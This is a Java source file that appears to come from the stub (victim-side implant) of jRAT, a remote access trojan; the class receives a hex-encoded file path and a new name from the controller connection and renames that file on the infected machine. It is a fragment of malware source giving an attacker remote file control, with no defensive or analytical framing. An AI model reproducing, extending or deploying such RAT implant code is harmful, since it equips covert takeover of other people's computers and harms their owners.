package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.codec.Hex;
import se.jrat.stub.Connection;


public class Packet47RenameFile extends AbstractIncomingPacket {

	public void read() throws Exception {
		String file = Connection.instance.readLine();
		String newname = Connection.instance.readLine();

		File f = new File(Hex.decode(file.substring(2, file.length())));
		File fto = new File(f.getAbsolutePath().replace(f.getName(), "") + newname);
		if (f.exists()) {
			f.renameTo(fto);
		}
	}

}
